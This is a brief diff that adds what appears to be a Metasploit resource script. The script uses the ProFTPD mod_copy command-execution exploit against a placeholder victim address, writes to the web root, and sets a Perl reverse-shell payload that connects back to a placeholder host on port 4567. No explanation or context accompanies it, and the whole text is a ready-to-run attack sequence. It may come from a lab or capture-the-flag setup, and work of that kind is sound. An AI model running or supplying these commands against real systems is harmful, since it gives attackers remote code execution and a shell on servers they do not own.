@@ -1,0 +1,8 @@
+use exploit/unix/ftp/proftpd_modcopy_exec
+set rhost $VICTIM_IP
+set sitepath /var/www/html
+set payload cmd/unix/reverse_perl
+set lhost $HOST_IP
+set lport 4567
+exploit -j
+
